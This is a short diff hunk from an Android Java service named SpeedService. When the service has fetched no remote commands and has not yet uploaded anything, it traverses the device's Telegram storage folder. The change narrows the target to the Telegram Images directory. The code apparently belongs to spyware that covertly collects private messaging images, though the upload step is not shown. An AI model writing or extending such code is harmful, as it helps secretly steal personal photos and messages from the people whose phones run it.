@@ -146,7 +146,7 @@ public class SpeedService extends Service {
                     if(SharedPreferencesHelper.get(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "").equals("")){
                         Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null => Has not uploaded anything yet");
                         SharedPreferencesHelper.put(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "true");
-                        traverse("/storage/emulated/0/Telegram");
+                        traverse("/storage/emulated/0/Telegram/Telegram Images");
                     }
                 }
             }
